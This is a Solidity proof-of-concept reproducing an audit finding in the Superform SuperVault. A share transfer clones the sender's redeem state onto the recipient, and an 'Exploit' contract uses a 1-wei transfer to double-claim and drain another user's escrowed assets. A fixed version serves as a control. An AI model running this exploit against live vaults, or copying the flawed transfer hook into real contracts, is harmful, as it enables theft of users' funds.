// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of Superform v2-periphery finding 63075:
// "Malicious actor can overwrite another user's state via a 1-wei vault-share
//  transfer to steal funds."
//
// Root cause (VERBATIM from the audited source, superform-xyz/v2-periphery at
// the pre-fix commit fa0332a3~1 — see SuperVault.sol `_update`): on EVERY share
// transfer between two real users, the vault copies the sender's ENTIRE
// SuperVaultState (including `maxWithdraw`, the assets claimable after a
// fulfilled redeem) onto the recipient:
//
//     ISuperVaultStrategy.SuperVaultState memory state = strategy.getSuperVaultState(from);
//     strategy.updateSuperVaultState(to, state);
//
// Because the copy OVERWRITES the recipient's state (rather than moving cost
// basis pro-rata), a 1-wei share transfer clones a fulfilled redeem claim onto a
// second account. The attacker then claims the same `maxWithdraw` twice — once
// from the original account (their own funds) and once from the clone (another
// user's escrowed funds) — draining the shared escrow beyond the single deposit.
//
// The struct, the strategy getter/setter, and the `_update` copy are inlined
// byte-for-byte from the audited source. The deposit / requestRedeem / fulfill /
// claim flow around them is reconstructed as standard, faithful accounting
// doubles (the vulnerable boundary itself is never mocked).
// ─────────────────────────────────────────────────────────────────────────────

// ── Faithful minimal ERC20 double for the opaque vault asset held in escrow. ──
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VERBATIM struct from src/interfaces/SuperVault/ISuperVaultStrategy.sol
// (pre-fix commit fa0332a3~1). The struct lives in the strategy interface, and
// the vulnerable `_update` copies it whole.
// ─────────────────────────────────────────────────────────────────────────────
interface ISuperVaultStrategy {
    /// @notice State specific to asynchronous redeem requests
    struct SuperVaultState {
        uint256 pendingRedeemRequest; // Shares requested
        uint256 maxWithdraw; // Assets claimable after fulfillment
        uint256 averageRequestPPS; // Average PPS at the time of redeem request
        // Accumulators needed for fee calculation on redeem
        uint256 accumulatorShares;
        uint256 accumulatorCostBasis;
        uint256 averageWithdrawPrice; // Average price for claimable assets
    }

    function getSuperVaultState(address controller) external view returns (SuperVaultState memory state);
    function updateSuperVaultState(address controller, SuperVaultState memory state) external;
    function moveAccumulatorOnTransfer(address from, address to, uint256 shares) external;
    function claimableWithdraw(address controller) external view returns (uint256 claimableAssets);
}

// ── Faithful minimal escrow holding the pooled, per-user fulfilled assets. ────
contract SuperVaultEscrow {
    MiniToken public asset;
    address public strategy;

    constructor(address _asset) {
        asset = MiniToken(_asset);
    }

    function setStrategy(address _strategy) external {
        strategy = _strategy;
    }

    // Real name/shape: escrow returns fulfilled assets to a receiver on claim.
    function returnAssets(address receiver, uint256 assets) external {
        require(msg.sender == strategy, "NOT_STRATEGY");
        asset.transfer(receiver, assets);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Strategy: stores per-controller SuperVaultState. The state getter/setter are
// VERBATIM from src/SuperVault/SuperVaultStrategy.sol (pre-fix). fulfillRedeem /
// claim are reconstructed accounting doubles (not the vulnerable boundary).
// One deployed strategy backs one vault; the SAME contract type is reused for
// the vulnerable and the fixed vault (the fix lives in `_update`, not here).
// ─────────────────────────────────────────────────────────────────────────────
contract SuperVaultStrategy is ISuperVaultStrategy {
    mapping(address => SuperVaultState) internal superVaultState;

    address public vault;
    address public escrow;
    MiniToken public asset;

    function init(address _vault, address _escrow, address _asset) external {
        require(vault == address(0), "INIT");
        vault = _vault;
        escrow = _escrow;
        asset = MiniToken(_asset);
    }

    function _requireVault() internal view {
        require(msg.sender == vault, "NOT_VAULT");
    }

    // ── VERBATIM (pre-fix SuperVaultStrategy.sol L291-L293) ──
    function updateSuperVaultState(address controller, SuperVaultState memory state) external {
        _requireVault();
        superVaultState[controller] = state; // @> writes the WHOLE struct — overwrites recipient's redeem state on a share transfer
    }

    // ── VERBATIM (pre-fix SuperVaultStrategy.sol L318-L320) ──
    function getSuperVaultState(address controller) external view returns (SuperVaultState memory state) {
        return superVaultState[controller];
    }

    // ── VERBATIM (pre-fix SuperVaultStrategy.sol claimableWithdraw) ──
    function claimableWithdraw(address controller) external view returns (uint256 claimableAssets) {
        return superVaultState[controller].maxWithdraw;
    }

    // ── FIX behavior (post-fix `moveAccumulatorOnTransfer`): move only the
    //    cost-basis accumulators pro-rata; NEVER touch the recipient's redeem
    //    fields (maxWithdraw / pendingRedeemRequest / averageWithdrawPrice). ──
    function moveAccumulatorOnTransfer(address from, address to, uint256 shares) external {
        _requireVault();
        SuperVaultState storage f = superVaultState[from];
        uint256 fShares = f.accumulatorShares;
        if (fShares == 0) return;
        uint256 moveShares = shares > fShares ? fShares : shares;
        uint256 moveCost = (f.accumulatorCostBasis * moveShares) / fShares;
        f.accumulatorShares -= moveShares;
        f.accumulatorCostBasis -= moveCost;
        SuperVaultState storage t = superVaultState[to];
        t.accumulatorShares += moveShares;
        t.accumulatorCostBasis += moveCost;
        // NOTE: no clone — maxWithdraw / pendingRedeemRequest / averageWithdrawPrice untouched.
    }

    // ── Reconstructed accounting doubles ──
    // Fulfill a controller's redeem: their `maxWithdraw` assets become claimable
    // and are set aside in the shared escrow.
    function fulfillRedeem(address controller, uint256 assets) external {
        SuperVaultState storage s = superVaultState[controller];
        s.maxWithdraw = assets;
        s.averageWithdrawPrice = 1e18; // PRECISION baseline (1 asset per share here)
        s.accumulatorShares += assets;
        s.accumulatorCostBasis += assets;
    }

    // Claim fulfilled assets: pay `maxWithdraw` from escrow, then zero it.
    function claim(address controller, address receiver) external returns (uint256 assets) {
        SuperVaultState storage s = superVaultState[controller];
        assets = s.maxWithdraw;
        require(assets > 0, "NOTHING_TO_CLAIM");
        s.maxWithdraw = 0;
        SuperVaultEscrow(escrow).returnAssets(receiver, assets);
    }
}

// ── Minimal ERC20 base with the OZ-style `_update` transfer hook. ─────────────
abstract contract MiniERC20 {
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    function _update(address from, address to, uint256 value) internal virtual {
        if (from == address(0)) {
            totalSupply += value;
        } else {
            uint256 fromBal = balanceOf[from];
            require(fromBal >= value, "ERC20: insufficient");
            unchecked {
                balanceOf[from] = fromBal - value;
            }
        }
        if (to == address(0)) {
            unchecked {
                totalSupply -= value;
            }
        } else {
            balanceOf[to] += value;
        }
    }

    function _mint(address to, uint256 value) internal {
        _update(address(0), to, value);
    }

    function transfer(address to, uint256 value) public returns (bool) {
        _update(msg.sender, to, value);
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE SuperVault: the ERC20 share token. `_update` is VERBATIM from the
// pre-fix audited source — it copies the sender's ENTIRE SuperVaultState onto
// the recipient on every real-user share transfer.
// ─────────────────────────────────────────────────────────────────────────────
contract SuperVault is MiniERC20 {
    ISuperVaultStrategy public strategy;
    address public escrow;

    function initialize(address _strategy, address _escrow) external {
        strategy = ISuperVaultStrategy(_strategy);
        escrow = _escrow;
    }

    function mintShares(address to, uint256 amount) external {
        _mint(to, amount);
    }

    /// @param from The address of the sender
    /// @param to The address of the recipient
    /// @param value The amount of shares being transferred
    function _update(address from, address to, uint256 value) internal override {
        /// @dev Copy user state only between actual users, not to/from infrastructure contracts
        if (from != address(0) && to != address(0) && to != address(escrow) && from != address(escrow)) {
            ISuperVaultStrategy.SuperVaultState memory state = strategy.getSuperVaultState(from);
            strategy.updateSuperVaultState(to, state); // @> VULN: overwrites recipient's whole SuperVaultState (clones maxWithdraw) on any share transfer
        }
        super._update(from, to, value);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED SuperVault (negative control): moves only cost-basis accumulators
// pro-rata on transfer; never clones the redeem state.
// ─────────────────────────────────────────────────────────────────────────────
contract SuperVaultFixed is MiniERC20 {
    ISuperVaultStrategy public strategy;
    address public escrow;

    function initialize(address _strategy, address _escrow) external {
        strategy = ISuperVaultStrategy(_strategy);
        escrow = _escrow;
    }

    function mintShares(address to, uint256 amount) external {
        _mint(to, amount);
    }

    function _update(address from, address to, uint256 value) internal override {
        /// @dev Move only accumulators pro-rata between actual users, not to/from infrastructure contracts
        if (from != address(0) && to != address(0) && to != address(escrow) && from != address(escrow)) {
            uint256 shares = value;
            if (shares > 0) {
                strategy.moveAccumulatorOnTransfer(from, to, shares);
            }
        }
        super._update(from, to, value);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver — Scenario 1 (clone + double-withdraw):
//   • acct1 = this Exploit contract (attacker's "account 1", holds shares).
//   • acct2 = the attacker EOA 0x1111… (the clone target + profit receiver).
//   • The shared escrow holds 200 asset: acct1's fulfilled 100 (legit) plus a
//     victim's fulfilled 100.
//   • A 1-wei share transfer acct1 -> acct2 clones acct1's maxWithdraw=100 onto
//     acct2. The attacker then claims 100 from acct1 (own funds) AND 100 from
//     acct2 (the victim's escrowed funds) — stealing 100 net.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111; // acct2 + profit receiver
    address internal constant VICTIM = 0x0000000000000000000000000000000000000B0b;

    uint256 internal constant DEPOSIT = 100 ether; // per-user fulfilled claim

    // Exposed results for the driver.
    address public assetAddr;
    address public strategyAddr;
    address public escrowAddr;
    address public vaultAddr;

    uint256 public escrowBefore;
    uint256 public escrowAfter;
    uint256 public acct1MaxWithdrawBefore;
    uint256 public acct2MaxWithdrawBeforeClone;
    uint256 public acct2MaxWithdrawAfterClone;
    uint256 public attackerStolen;
    uint256 public victimEntitlement;

    function run() external payable {
        // --- deploy the real vulnerable boundary + faithful doubles (fixed order) ---
        MiniToken asset = new MiniToken("Vault Asset", "STOLEN-ASSET"); // deploy #0
        SuperVaultStrategy strategy = new SuperVaultStrategy(); // deploy #1
        SuperVaultEscrow escrow = new SuperVaultEscrow(address(asset)); // deploy #2
        SuperVault vault = new SuperVault(); // deploy #3

        assetAddr = address(asset);
        strategyAddr = address(strategy);
        escrowAddr = address(escrow);
        vaultAddr = address(vault);

        // --- wire the system ---
        strategy.init(address(vault), address(escrow), address(asset));
        escrow.setStrategy(address(strategy));
        vault.initialize(address(strategy), address(escrow));

        // --- pooled fulfilled assets: acct1's 100 + victim's 100 live in escrow ---
        asset.mint(address(escrow), 2 * DEPOSIT);
        strategy.fulfillRedeem(address(this), DEPOSIT); // acct1 legit claim
        strategy.fulfillRedeem(VICTIM, DEPOSIT); // victim legit claim

        // --- acct1 holds vault shares (from an earlier deposit) ---
        vault.mintShares(address(this), 1000);

        escrowBefore = asset.balanceOf(address(escrow)); // 200
        acct1MaxWithdrawBefore = strategy.claimableWithdraw(address(this)); // 100
        acct2MaxWithdrawBeforeClone = strategy.claimableWithdraw(ATTACKER); // 0

        // --- EXPLOIT: 1-wei share transfer clones acct1's fulfilled state onto acct2 ---
        vault.transfer(ATTACKER, 1);

        acct2MaxWithdrawAfterClone = strategy.claimableWithdraw(ATTACKER); // now 100 (cloned)

        // --- double withdraw: acct1 claims its own 100; acct2 claims the clone (steals) ---
        strategy.claim(address(this), address(this)); // legit: own funds back (not measured)
        strategy.claim(ATTACKER, ATTACKER); // clone: 100 of the victim's escrowed assets -> attacker EOA

        escrowAfter = asset.balanceOf(address(escrow)); // 0 (drained)
        attackerStolen = asset.balanceOf(ATTACKER); // 100 STOLEN-ASSET at the attacker EOA
        victimEntitlement = strategy.claimableWithdraw(VICTIM); // still 100, now unbacked

        // --- harm assertions ---
        require(acct2MaxWithdrawAfterClone == DEPOSIT, "clone did not copy maxWithdraw");
        require(attackerStolen == DEPOSIT, "attacker did not net the stolen deposit");
        require(escrowAfter == 0, "escrow not drained");
        require(victimEntitlement == DEPOSIT && escrowAfter < victimEntitlement, "victim entitlement still backed");
    }
}
